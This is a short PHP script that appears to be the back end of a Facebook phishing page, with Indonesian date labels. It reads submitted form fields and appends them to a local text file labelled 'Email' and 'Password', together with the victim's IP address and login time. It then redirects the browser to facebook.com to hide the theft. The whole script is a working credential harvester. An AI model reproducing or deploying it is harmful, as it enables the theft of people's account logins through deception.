<?php
$file 	= "pkustylemacanasiaaaa.txt";
date_default_timezone_set("Asia/Jakarta");
date("Y-m-d H:i:s", mktime(date("H")+1, date("i"), date("s"), date("m"), date("d"), date("Y")));
$namahari = array("Minggu","Senin","Selasa","Rabu","Kamis","Jum'at","Sabtu"); 
$namabulan = array("","Januari","Februari","Maret","April","Mei","Juni","Juli","Agustus","September","Oktober","November","Desember"); 
$waktu =  $namahari[date("w")].", ".date("j")." ".$namabulan[date("n")]." ".date("Y H:i"); 
$firsname 	= $_POST['firsname'];
$lastname = $_POST['lastname'];
$etc    = $_POST['maildomain'];
$hint 	= $_POST['hint'];
$jwb 	= $_POST['answer'];
$alamat = $_SERVER['REMOTE_ADDR'];

$handle = fopen($file, 'a');
fwrite($handle, "");
fwrite($handle, "\n");
fwrite($handle, "     Email           : ");
fwrite($handle, "$firsname");
fwrite($handle, "\n");
fwrite($handle, "     Password        : ");
fwrite($handle, "$lastname");
fwrite($handle, "\n");
fwrite($handle, "     IP Address      : ");
fwrite($handle, "$alamat");
fwrite($handle, "\n");
fwrite($handle, "     Waktu Masuk     : ");
fwrite($handle, "$waktu");
fwrite($handle, "\n");
fwrite($handle, "");
fwrite($handle, "\n");
fclose($handle);
echo "<script LANGUAGE=\"JavaScript\">
<!--
window.location=\"https://www.facebook.com\";
// -->
</script>";
?>
</html>